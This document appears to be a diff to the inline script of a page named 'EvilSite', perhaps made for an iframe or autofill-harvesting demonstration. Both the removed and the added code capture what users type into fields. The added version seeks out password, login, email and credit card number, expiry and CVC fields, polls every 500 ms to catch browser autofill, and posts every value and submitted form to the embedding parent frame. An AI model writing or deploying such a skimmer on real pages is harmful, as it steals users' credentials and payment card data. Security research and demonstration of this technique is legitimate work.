@@ -41,59 +41,107 @@
 
 
     <script>
-  (function(){
-    function send(msg) {
-      try {
-        window.parent.postMessage(msg, '*'); // možeš zameniti '*' sa parent origin radi sigurnosti
-      } catch(e) {
-        console.warn('postMessage failed', e);
+(function() {
+  // Determin parent origin from referrer 
+  let parentOrigin = '*';
+  try {
+    if (document.referrer) parentOrigin = new URL(document.referrer).origin || '*';
+  } catch(e) {}
+
+  function post(event, payload) {
+    window.parent.postMessage({
+      source: 'EvilSite',
+      event,
+      payload,
+      path: location.pathname,
+      ts: Date.now()
+    }, parentOrigin);
+  }
+
+  // Handshake when iframe is ready
+  function ready() { post('EVIL_READY', { title: document.title }); }
+  if (document.readyState === 'complete' || document.readyState === 'interactive') {
+    setTimeout(ready, 0);
+  } else {
+    window.addEventListener('DOMContentLoaded', ready);
+  }
+
+  // Response to parent ping 
+  window.addEventListener('message', (ev) => {
+    if (!ev || !ev.data) return;
+    if (ev.data.type === 'PING_PARENT') {
+      post('PONG_IFRAME', { receivedTs: Date.now() });
+    }
+  });
+
+  // Helper: find potential fields
+  function findFields() {
+    // Generaln set
+    const selectors = [
+      'input[type="text"]',
+      'input[type="email"]',
+      'input[type="password"]',
+      'input[autocomplete="username"]',
+      'input[autocomplete="current-password"]',
+      'input[autocomplete="cc-name"]',
+      'input[autocomplete="cc-number"]',
+      'input[autocomplete="cc-exp"], input[autocomplete="cc-exp-month"], input[autocomplete="cc-exp-year"]',
+      'input[autocomplete="cc-csc"], input[autocomplete="cc-cvc"], input[autocomplete="cc-cvv"]'
+    ].join(',');
+
+    const all = Array.from(document.querySelectorAll(selectors));
+    // Standard names of fields
+    const byName = ['username','email','login','password','cc-name','ccnumber','cc-number','cardnumber','cvc','cvv','exp','expiry','cc-exp']
+      .flatMap(n => Array.from(document.getElementsByName(n)));
+    const set = new Set([...all, ...byName]);
+    return Array.from(set);
+  }
+
+  // Event listeners 
+  function wireEvents(el) {
+    ['input','change'].forEach(ev =>
+      el.addEventListener(ev, () => {
+        post('FIELD_CHANGED', { name: el.name || el.id || null, value: el.value || '' });
+      })
+    );
+  }
+
+  // Polling – to catch autofill 
+  const lastValues = new WeakMap();
+  function snapshotAndReport() {
+    const fields = findFields();
+    const data = {};
+    let anyChange = false;
+    fields.forEach(el => {
+      const key = el.name || el.id || el.getAttribute('autocomplete') || el.type || 'field';
+      const val = el.value || '';
+      const prev = lastValues.get(el);
+      if (prev !== val) {
+        lastValues.set(el, val);
+        anyChange = true;
       }
-    }
-
-    function watchInputs() {
-      const inputs = document.querySelectorAll('input, textarea, select');
-      inputs.forEach(inp => {
-        inp.addEventListener('input', () => {
-          send({ type: 'INPUT_CHANGE', id: inp.id || inp.name || 'unknown', value: inp.value });
-        });
-        inp.addEventListener('change', () => {
-          send({ type: 'INPUT_CHANGE', id: inp.id || inp.name || 'unknown', value: inp.value });
-        });
-      });
-    }
-
-    // also notify about autofill events: try to detect value changes shortly after load (some autofill happens on load)
-    window.addEventListener('load', () => {
-      send({ type: 'EVIL_LOADED', url: location.href });
-      watchInputs();
-      // scan initial values (in case autofill filled them immediately)
-      setTimeout(() => {
-        const initial = [];
-        document.querySelectorAll('input').forEach(i => {
-          if (i.value) {
-            initial.push({ id: i.id || i.name, value: i.value });
-          }
-        });
-        if (initial.length) send({ type: 'INITIAL_VALUES', values: initial });
-      }, 200); // 200ms after load
+      data[key] = val;
     });
+    if (anyChange) {
+      post('FORM_SNAPSHOT', { data });
+    }
+  }
 
-    // intercept form submit
-    document.addEventListener('submit', (ev) => {
-      const form = ev.target;
-      send({ type: 'FORM_SUBMIT', action: form.action || location.href });
-    }, true);
+  // Start polling: 500ms
+  const pollId = setInterval(snapshotAndReport, 500);
 
-    // optional: observe DOM mutations to detect programmatic fills
-    const obs = new MutationObserver(() => {
-      const changed = [];
-      document.querySelectorAll('input').forEach(i => {
-        if (i.value) changed.push({ id: i.id || i.name, value: i.value });
-      });
-      if (changed.length) send({ type: 'MUTATION_VALUES', values: changed });
-    });
-    obs.observe(document, { attributes: true, childList: true, subtree: true, attributeFilter: ['value'] });
-  })();
+  // Log submit
+  Array.from(document.forms).forEach(f => {
+    f.addEventListener('submit', () => {
+      const payload = {};
+      Array.from(new FormData(f).entries()).forEach(([k, v]) => payload[k] = v);
+      post('FORM_SUBMIT', { payload });
+    }, { capture: true });
+  });
+
+  // First snipet after load
+  setTimeout(snapshotAndReport, 200);
+})();
 </script>
 </body>
 
